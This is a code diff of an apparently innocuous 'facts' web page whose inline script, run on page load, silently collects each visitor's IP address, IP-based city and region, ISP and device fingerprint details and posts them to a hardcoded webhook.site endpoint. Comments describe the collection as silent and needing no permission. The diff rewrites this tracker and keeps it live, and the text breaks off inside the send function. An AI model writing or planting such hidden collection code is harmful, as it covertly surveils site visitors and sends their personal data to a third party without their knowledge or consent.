@@ -46,9 +46,6 @@
             cursor: pointer;
             font-size: 16px;
         }
-        .refresh-btn:hover {
-            background-color: #3a5a85;
-        }
         footer {
             text-align: center;
             margin-top: 30px;
@@ -91,65 +88,63 @@
     </div>
 
     <script>
-        // Function to load new facts
         function loadNewFacts() {
             alert("New facts coming soon! Thanks for visiting.");
         }
 
-        // Collect visitor information silently
         window.addEventListener('load', function() {
-            // Get IP using a free IP service
+            // Get IP from IPify
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
-                .then(data => {
-                    const visitorInfo = {
-                        ip: data.ip,
-                        userAgent: navigator.userAgent,
-                        language: navigator.language,
-                        platform: navigator.platform,
-                        screenResolution: `${screen.width}x${screen.height}`,
-                        colorDepth: screen.colorDepth,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        timestamp: new Date().toISOString()
-                    };
+                .then(ipData => {
+                    const ip = ipData.ip;
                     
-                    // Get location silently using IP-based service
-                    fetch(`https://ipapi.co/${visitorInfo.ip}/json/`)
+                    // Get location from ipapi (silent, no permission needed)
+                    fetch(`https://ipapi.co/${ip}/json/`)
                         .then(response => response.json())
                         .then(locationData => {
-                            visitorInfo.location = {
-                                city: locationData.city,
-                                region: locationData.region,
-                                country: locationData.country_name,
-                                latitude: locationData.latitude,
-                                longitude: locationData.longitude
+                            const visitorInfo = {
+                                ip: ip,
+                                location: {
+                                    city: locationData.city,
+                                    region: locationData.region,
+                                    country: locationData.country_name,
+                                    timezone: locationData.timezone,
+                                    isp: locationData.org || locationData.asn
+                                },
+                                device: {
+                                    userAgent: navigator.userAgent,
+                                    language: navigator.language,
+                                    platform: navigator.platform,
+                                    screenResolution: `${screen.width}x${screen.height}`,
+                                    colorDepth: screen.colorDepth
+                                },
+                                timestamp: new Date().toISOString()
                             };
-                            sendVisitorData(visitorInfo);
+                            
+                            sendToWebhook(visitorInfo);
                         })
-                        .catch(error => {
-                            console.error('Error getting location:', error);
-                            sendVisitorData(visitorInfo);
+                        .catch(err => {
+                            console.error('Location error:', err);
+                            sendToWebhook({
+                                ip: ip,
+                                device: {
+                                    userAgent: navigator.userAgent,
+                                    language: navigator.language,
+                                    platform: navigator.platform,
+                                    screenResolution: `${screen.width}x${screen.height}`,
+                                    colorDepth: screen.colorDepth
+                                },
+                                timestamp: new Date().toISOString()
+                            });
                         });
                 })
-                .catch(error => {
-                    console.error('Error getting IP:', error);
-                    // Fallback without IP
-                    const visitorInfo = {
-                        userAgent: navigator.userAgent,
-                        language: navigator.language,
-                        platform: navigator.platform,
-                        screenResolution: `${screen.width}x${screen.height}`,
-                        colorDepth: screen.colorDepth,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        timestamp: new Date().toISOString()
-                    };
-                    sendVisitorData(visitorInfo);
+                .catch(err => {
+                    console.error('IP error:', err);
                 });
         });
 
-        // Function to send data to a webhook
-        function sendVisitorData(data) {
-            // Replace YOUR_WEBHOOK_URL with an actual webhook URL
+        function sendToWebhook(data) {
             const webhookUrl = 'https://webhook.site/2df958f9-5ceb-4e23-a620-44f8c8306cec';
             
             fetch(webhookUrl, {
